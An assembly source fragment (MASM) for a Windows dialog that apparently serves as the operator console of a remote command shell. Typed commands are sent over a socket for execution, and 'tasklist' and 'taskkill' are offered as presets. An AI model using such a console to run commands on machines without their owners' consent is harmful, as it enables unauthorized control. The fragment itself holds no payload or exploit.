
InitRichEdit proc uses ebx esi edi lParam
	LOCAL	@stCf:CHARFORMAT
	invoke RtlZeroMemory,addr @stCf,sizeof CHARFORMAT
	mov	@stCf.cbSize,sizeof @stCf
	mov	@stCf.dwMask,CFM_SIZE or CFM_FACE or CFM_BOLD or CFM_COLOR
	mov @stCf.yHeight,180
	mov	@stCf.crTextColor,0FFFFFFh
	mov	@stCf.dwEffects,0
	invoke	lstrcpy,addr @stCf.szFaceName,CTEXT("µ„’Û◊÷ÃÂ")
	invoke	SendDlgItemMessage,lParam,6001,EM_SETTEXTMODE,TM_PLAINTEXT,0
	invoke	SendDlgItemMessage,lParam,6001,EM_SETCHARFORMAT,SCF_ALL,addr @stCf
	invoke  SendDlgItemMessage,lParam,6001,EM_SETBKGNDCOLOR,0,0000000h
	invoke 	SendDlgItemMessage,lParam,6001,EM_EXLIMITTEXT,0,7A1200h
	invoke	SendDlgItemMessage,lParam,6002,EM_SETTEXTMODE,TM_PLAINTEXT,0
	invoke	SendDlgItemMessage,lParam,6002,EM_SETCHARFORMAT,SCF_ALL,addr @stCf
	invoke  SendDlgItemMessage,lParam,6002,EM_SETBKGNDCOLOR,0,0000000h
	invoke 	SendDlgItemMessage,lParam,6002,EM_EXLIMITTEXT,0,7A1200h
	invoke  SendDlgItemMessage,lParam,6002,EM_SETEVENTMASK,0,ENM_KEYEVENTS
	ret
InitRichEdit endp

ProcDlgCmd	proc uses ebx edi esi hWnd,wMsg,wParam,lParam
	LOCAL @rect:RECT
    mov eax,wMsg
    .if eax==WM_CLOSE
		invoke GetWindowLong,hWnd,GWL_USERDATA
		mov esi,eax
		assume esi:ptr OVERLAPPEDPLUS
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
		invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.cmdclose
		invoke SendMessage,[esi].hmainform,DESTROYWINDOW,esi,0
		assume esi:nothing
		invoke EndDialog,hWnd,NULL
	.elseif	eax==WM_INITDIALOG
		invoke LoadIcon,hInstance,ICO_MAIN
		invoke SendMessage,hWnd,WM_SETICON,ICON_BIG,eax
		invoke InitRichEdit,hWnd
	.elseif eax==WM_SIZE
		invoke GetClientRect,hWnd,addr @rect
		invoke GetDlgItem,hWnd,6001
		mov ebx,eax
		mov edi,@rect.bottom
		sub edi,22
		invoke SetWindowPos,ebx,HWND_NOTOPMOST,0,0,@rect.right,edi,SWP_NOZORDER
		invoke GetDlgItem,hWnd,6002
		mov ebx,eax
		mov edi,@rect.bottom
		sub edi,22
		invoke SetWindowPos,ebx,HWND_NOTOPMOST,0,edi,@rect.right,22,SWP_NOZORDER
	.elseif eax==WM_NOTIFY 
		mov edi,lParam
		assume edi:ptr MSGFILTER
		.if [edi].nmhdr.idFrom==6002 && [edi].nmhdr.code==EN_MSGFILTER
			.if [edi].msg==WM_KEYDOWN
			    .if [edi].wParam==VK_RETURN
					invoke GetWindowLong,hWnd,GWL_USERDATA
					mov esi,eax
					assume esi:ptr OVERLAPPEDPLUS
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,1024
					mov ebx,eax
			    	invoke GetWindowText,[esi].hCmdRich1,ebx,1024
			    	invoke lstrcat,ebx,addr lslsnr
			    	invoke lstrlen,ebx
			    	invoke WSASends,[esi].hsocket,ebx,eax,SOCKETTAG.cmdrun
					invoke SetWindowText,[esi].hCmdRich1,NULL
					assume esi:nothing
				.elseif [edi].wParam==VK_DELETE
					invoke IsClipboardFormatAvailable,CF_TEXT
					.if eax
						invoke OpenClipboard,NULL
						invoke GetClipboardData,CF_TEXT
						mov edi,eax
						invoke GlobalLock,edi
						invoke GetDlgItem,hWnd,6002
						mov ebx,eax
						invoke SetWindowText,ebx,edi
						invoke SendMessage,ebx,EM_SETSEL,-1,-1
						invoke GlobalUnlock,edi
						invoke CloseClipboard
					.endif 
				.elseif [edi].wParam==VK_UP
					invoke GetDlgItem,hWnd,6002
					mov ebx,eax
					invoke SetWindowText,ebx,CTEXT("tasklist ")
					invoke SendMessage,ebx,EM_SETSEL,-1,-1
				.elseif [edi].wParam==VK_DOWN	 
					invoke GetDlgItem,hWnd,6002
					mov ebx,eax
					invoke SetWindowText,ebx,CTEXT("taskkill /f /pid ")
					invoke SendMessage,ebx,EM_SETSEL,-1,-1
			    .endif
			.endif
		.endif
		assume edi:nothing
	.elseif eax==6100
		invoke GetWindowLong,hWnd,GWL_USERDATA
		mov esi,eax
		assume esi:ptr OVERLAPPEDPLUS
		invoke SetFocus,[esi].hCmdRich
		assume esi:nothing
	.elseif eax==6200	
		invoke GetWindowLong,hWnd,GWL_USERDATA
		mov esi,eax
		assume esi:ptr OVERLAPPEDPLUS
		invoke SetFocus,[esi].hCmdRich1
		assume esi:nothing
    .else
		mov eax,FALSE
		ret	
	.endif	
	mov eax,TRUE
	ret	
ProcDlgCmd endp
